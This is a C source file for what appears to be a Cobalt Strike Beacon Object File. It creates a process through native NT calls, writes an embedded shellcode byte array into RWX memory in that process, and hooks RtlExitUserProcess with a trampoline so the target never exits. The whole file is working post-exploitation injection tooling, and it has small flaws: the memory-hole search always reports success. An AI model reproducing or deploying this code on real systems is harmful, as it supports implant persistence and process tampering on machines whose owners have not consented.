#include <windows.h>
#include "ntdll.h"
#include "beacon.h"

#define NT_SUCCESS(Status) ((Status) >= 0)
/*
 * no exit shellcode base on
 * https://github.com/merlinepedra/ShellcodeTemplate
 */
char pPayload[] = {
    0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
    0xe8, 0x0f, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e,
    0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0xb9, 0xf0, 0x1d,
    0xd3, 0xad, 0x31, 0xf6, 0x53, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x8e, 0x00,
    0x00, 0x00, 0xb9, 0x53, 0x17, 0xe6, 0x70, 0x48, 0x89, 0xc3, 0xe8, 0x81,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x74, 0x1d, 0xba, 0xdb, 0x2f, 0x07,
    0xb7, 0x48, 0x89, 0xd9, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0xba, 0x7e, 0xcd,
    0x07, 0x0e, 0x48, 0x89, 0xd9, 0xe8, 0xb3, 0x00, 0x00, 0x00, 0x48, 0x89,
    0xc6, 0xb9, 0xa0, 0x86, 0x01, 0x00, 0xff, 0xd6, 0xeb, 0xf7, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x49, 0x89, 0xc9, 0xb8, 0x05, 0x15, 0x00, 0x00,
    0x45, 0x8a, 0x01, 0x48, 0x85, 0xd2, 0x75, 0x06, 0x45, 0x84, 0xc0, 0x75,
    0x16, 0xc3, 0x45, 0x89, 0xca, 0x41, 0x29, 0xca, 0x49, 0x39, 0xd2, 0x73,
    0x23, 0x45, 0x84, 0xc0, 0x75, 0x05, 0x49, 0xff, 0xc1, 0xeb, 0x0a, 0x41,
    0x80, 0xf8, 0x60, 0x76, 0x04, 0x41, 0x83, 0xe8, 0x20, 0x6b, 0xc0, 0x21,
    0x45, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc1, 0x44, 0x01, 0xc0, 0xeb, 0xc4,
    0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x57, 0x56, 0x48, 0x89, 0xce, 0x53, 0x48, 0x83, 0xec, 0x20, 0x65, 0x48,
    0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48,
    0x8b, 0x78, 0x20, 0x48, 0x89, 0xfb, 0x0f, 0xb7, 0x53, 0x48, 0x48, 0x8b,
    0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89, 0xc0, 0x48, 0x39, 0xf0,
    0x75, 0x06, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11, 0x48, 0x8b, 0x1b, 0x48,
    0x85, 0xdb, 0x74, 0x05, 0x48, 0x39, 0xdf, 0x75, 0xd9, 0x48, 0x83, 0xc8,
    0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0xc3, 0x41, 0x57, 0x49,
    0x89, 0xd7, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xed, 0x57,
    0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x28, 0x48, 0x63, 0x41,
    0x3c, 0x8b, 0xbc, 0x08, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xcf, 0x44,
    0x8b, 0x77, 0x20, 0x44, 0x8b, 0x67, 0x1c, 0x44, 0x8b, 0x6f, 0x24, 0x49,
    0x01, 0xce, 0x3b, 0x6f, 0x18, 0x73, 0x31, 0x89, 0xee, 0x31, 0xd2, 0x41,
    0x8b, 0x0c, 0xb6, 0x48, 0x01, 0xd9, 0xe8, 0x15, 0xff, 0xff, 0xff, 0x4c,
    0x39, 0xf8, 0x75, 0x18, 0x48, 0x01, 0xf6, 0x48, 0x01, 0xde, 0x42, 0x0f,
    0xb7, 0x04, 0x2e, 0x48, 0x8d, 0x04, 0x83, 0x42, 0x8b, 0x04, 0x20, 0x48,
    0x01, 0xd8, 0xeb, 0x04, 0xff, 0xc5, 0xeb, 0xca, 0x48, 0x83, 0xc4, 0x28,
    0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f,
    0xc3, 0x90, 0x90, 0x90, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83,
    0xe8, 0x05, 0xc3, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
/* For createProcess bof */
WINBASEAPI NTSTATUS NTAPI NTDLL$NtCurrentTeb();
WINBASEAPI NTSTATUS NTAPI NTDLL$RtlInitUnicodeString(
    PUNICODE_STRING DestinationString, PCWSTR SourceString);
WINBASEAPI NTSTATUS NTAPI NTDLL$RtlCreateProcessParametersEx(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine,
    PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
WINBASEAPI PVOID NTAPI NTDLL$RtlAllocateHeap(PVOID HeapHandle, ULONG Flags,
                                             SIZE_T Size);
WINBASEAPI NTSTATUS NTAPI NTDLL$RtlFreeHeap(PVOID HeapHandle, ULONG Flags,
                                            PVOID BaseAddress);
WINBASEAPI NTSTATUS NTAPI NTDLL$RtlDestroyProcessParameters(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtCreateUserProcess(
    PHANDLE ProcessHandle, PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags,
    ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST AttributeList);
WINBASEAPI int __cdecl MSVCRT$swprintf_s(wchar_t *buffer, size_t sizeOfBuffer,
                                         const wchar_t *format, ...);
WINBASEAPI DWORD WINAPI KERNEL32$GetProcessId(HANDLE hProcess);
/* end of createProcess bof */

/* For Hook process */
WINBASEAPI NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
WINBASEAPI NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, PULONG RegionSize,
    ULONG AllocationType, ULONG Protect);

WINBASEAPI NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection, PULONG OldAccessPRotection);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule,
                                                  LPCSTR lpProcName);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void *__restrict__ _Dst,
                                       const void *__restrict__ _Src,
                                       size_t _MaxCount);
/* end of hook process */

BOOL Hook(HANDLE hProcess);
BOOL HookFunction(HANDLE hProcess, PVOID pHookedFunction, PVOID pMemoryHole);
BOOL FindMemoryHole(HANDLE hProcess, ULONG_PTR *puAddress,
                    ULONG_PTR uExportedFuncAddress, SIZE_T sPayloadSize);
VOID go(IN PCHAR Buffer, IN ULONG Length) {
    datap parser;
    WCHAR wcFileName[MAX_PATH];

    BeaconDataParse(&parser, Buffer, Length);
    LPWSTR lpwBinaryPath = (WCHAR *)BeaconDataExtract(&parser, NULL);
    LPWSTR lpwCommandLine = (WCHAR *)BeaconDataExtract(&parser, NULL);
    ULONG noExit = BeaconDataInt(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "[i] Binary path: %ls\n", lpwBinaryPath);
    if (noExit)
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[i] Will hook target process ExitProcess function\n");

    MSVCRT$swprintf_s(wcFileName, _countof(wcFileName), L"\\??\\%ls",
                      lpwBinaryPath);

    /* Path to the image file from which the process will be created */
    UNICODE_STRING NtImagePath;
    NTDLL$RtlInitUnicodeString(&NtImagePath, wcFileName);

    /* Create the process parameters */
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    if (*lpwCommandLine != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Parameters: %ls\n", lpwCommandLine);
        WCHAR wcCommandLine[MAX_PATH];

        MSVCRT$swprintf_s(wcCommandLine, _countof(wcFileName), L"%ls %ls",
                          lpwBinaryPath, lpwCommandLine);

        UNICODE_STRING NtParameters;
        NTDLL$RtlInitUnicodeString(&NtParameters, wcCommandLine);
        NTDLL$RtlCreateProcessParametersEx(
            &ProcessParameters, &NtImagePath, NULL, NULL, &NtParameters, NULL,
            NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Parameters: NULL");
        NTDLL$RtlCreateProcessParametersEx(
            &ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL,
            NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
    }

    /* Initialize the PS_CREATE_INFO structure */
    PS_CREATE_INFO CreateInfo = {0};
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    /* Initialize the PS_ATTRIBUTE_LIST structure */
    PPS_ATTRIBUTE_LIST AttributeList =
        (PS_ATTRIBUTE_LIST *)NTDLL$RtlAllocateHeap(
            RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    AttributeList->TotalLength =
        sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

    /* Create the process */
    HANDLE hProcess, hThread = NULL;
    NTDLL$NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS,
                              THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL,
                              ProcessParameters, &CreateInfo, AttributeList);
    DWORD dwProcessId = KERNEL32$GetProcessId(hProcess);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ProcessId: %d\n", dwProcessId);

    /* Clean up */
    NTDLL$RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
    NTDLL$RtlDestroyProcessParameters(ProcessParameters);

    if (noExit) Hook(hProcess);
    return;
};
BOOL Hook(HANDLE hProcess) {
    NTSTATUS NtStatus = NULL;
    PULONG pPayloadAddr = NULL;
    /* Get a never call function address to find RWX memory hole*/
    PULONG puNeverCallFunctionAddr = (PULONG)GetProcAddress(
        GetModuleHandleA("NTDLL"), "NtCreateWnfStateName");

    /* Get target function ExitProcess address */
    PULONG puTargetFunctionAddr =
        (PULONG)GetProcAddress(GetModuleHandleA("NTDLL"), "RtlExitUserProcess");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target process exit function at: %p\n",
                 puTargetFunctionAddr);

    /* Find target process memory hole */
    if (!FindMemoryHole(hProcess, &pPayloadAddr, puNeverCallFunctionAddr,
                        sizeof(pPayload))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find memory hole\n");
        return 0;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] payload address memory hole: %p\n",
                 pPayloadAddr);
    /* Write no exit shellcode */
    SIZE_T sByteWritten = NULL;
    NtStatus = NTDLL$NtWriteVirtualMemory(hProcess, pPayloadAddr, pPayload,
                                          sizeof(pPayload), &sByteWritten);
    if (!NT_SUCCESS(NtStatus)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Faild to write no exit shellcode <-> "
                     "Written: %d/%d\n",
                     sByteWritten, sizeof(pPayload));
        return 0;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Payload write successfully %d/%d\n",
                 sByteWritten, sizeof(pPayload));
    /* Install Trampoline */
    if (!HookFunction(hProcess, (PVOID)puTargetFunctionAddr,
                      (PVOID)pPayloadAddr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Faild to install trampoline\n");
        return 0;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done!\n");

    return 1;
}
BOOL FindMemoryHole(HANDLE hProcess, ULONG_PTR *puAddress,
                    ULONG_PTR uExportedFuncAddress, SIZE_T sPayloadSize) {
    ULONG_PTR uAddress = 0;
    SIZE_T sTmpSizeVar = sPayloadSize;
    NTSTATUS NtStatus = NULL;
    for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
         uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) {
        NtStatus = NTDLL$NtAllocateVirtualMemory(
            hProcess, &uAddress, 0, &sTmpSizeVar, MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (NT_SUCCESS(NtStatus)) {
            *puAddress = uAddress;
            break;
        }
    }
    return 1;
}

BOOL HookFunction(HANDLE hProcess, PVOID pHookedFunction, PVOID pMemoryHole) {
    NTSTATUS NtStatus = NULL;
    DWORD uOldProtection = 0x00;
    unsigned char uTrampoline[0x05] = {0xE8, 0x00, 0x00, 0x00, 0x00};
    unsigned long ullRVA = (unsigned long)((ULONG_PTR)pMemoryHole -
                                           ((ULONG_PTR)pHookedFunction +
                                            sizeof(uTrampoline))); // The RVA
    SIZE_T sTmpSizeVar = sizeof(uTrampoline);
    SIZE_T sByteWritten = 0x00;
    ULONG_PTR pTmpAddress = (ULONG_PTR)pHookedFunction;

    MSVCRT$memcpy(&uTrampoline[0x01], &ullRVA, sizeof(ullRVA));

    NtStatus =
        NTDLL$NtProtectVirtualMemory(hProcess, &pTmpAddress, &sTmpSizeVar,
                                     PAGE_EXECUTE_READWRITE, &uOldProtection);
    if (!NT_SUCCESS(NtStatus)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Change permission failed <-> Old protection: %d\n",
                     uOldProtection);
        return 0;
    }

    NtStatus =
        NTDLL$NtWriteVirtualMemory(hProcess, pHookedFunction, uTrampoline,
                                   sizeof(uTrampoline), &sByteWritten);
    if (!NT_SUCCESS(NtStatus)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Faild to write trampoline <-> "
                     "Written: %d/%d\n",
                     sByteWritten, sizeof(uTrampoline));
        return 0;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Trampoline write successfully %d/%d\n",
                 sByteWritten, sizeof(uTrampoline));

    return 1;
}
